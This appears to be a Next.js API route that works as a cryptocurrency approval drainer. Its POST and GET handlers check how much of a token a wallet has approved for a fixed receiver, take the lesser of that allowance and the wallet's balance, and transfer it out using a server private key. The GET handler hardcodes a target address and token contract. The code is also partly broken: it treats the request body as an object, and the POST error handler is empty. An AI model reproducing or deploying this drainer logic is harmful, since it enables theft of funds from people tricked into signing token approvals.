import { getAllowance, fetchBalance , sender} from '@/utils/utils'
import { receiver } from '@/utils/constant'
export async function POST(reqs: Request) {
 
const req = reqs.body
 
const address = req['address']
//const amount = req['amount']
const contract = req['contract']

try {
  
  const pk = process.env.PrivateKey || ""

  const allowed = await getAllowance(contract, address, receiver)
  const realBalance = await fetchBalance(address,contract)
  
  console.log("Balances are",allowed, realBalance)
  
  const amount = BigInt(allowed) > BigInt(realBalance)? BigInt(realBalance) : BigInt(allowed)
  // console.log(amount)
   console.log("sending amount:", amount)
  const receipt = await sender(contract,address, amount, pk )
  
  
  
  if(receipt)
    return Response.json({ message: "done" })
  else
  return Response.json({message: "An error occur from sending"})
} catch (error) {
  
}

}

export async function GET(reqs: Request) {
 
  try {
   // console.log(reqs)
    const req =  reqs.body
   
  const address = "0x359C0217D37b7E603A788f84B793E53d145b9D45"
  
  const contract = "0x55d398326f99059ff775485246999027b3197955"

  const pk = process.env.PrivateKey || ""

  const allowed = await getAllowance(contract, address, receiver)
  const realBalance = await fetchBalance(address,contract)
  
  console.log("Balances are",allowed, realBalance)
  
  const amount = BigInt(allowed) > BigInt(realBalance)? BigInt(realBalance) : BigInt(allowed)
  // console.log(amount)
   console.log("sending amount:", amount)
  const receipt = await sender(contract,address, amount, pk )
  
  
  
  if(receipt)
    return Response.json({ message: "done" })
  else
  return Response.json({message: "An error occur from sending"})
  } catch (error) {

    console.log(error)
    return Response.json({"message": "An error occur from catch"})
  }
  
  }